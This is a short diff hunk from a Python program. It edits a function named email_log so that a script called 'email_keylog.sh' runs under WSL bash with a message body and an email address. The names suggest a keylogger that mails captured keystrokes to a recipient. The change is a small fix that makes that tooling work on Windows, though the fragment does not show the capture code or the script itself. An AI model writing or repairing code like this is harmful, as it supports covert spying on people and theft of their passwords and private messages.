@@ -30,7 +30,7 @@ def main():
 def email_log(body, email_addr):
     try:
         result = subprocess.run(
-            ["./email_keylog.sh", body, email_addr],
+            ["wsl", "bash", "./email_keylog.sh", body, email_addr],
             text=True,
             capture_output=True
         )
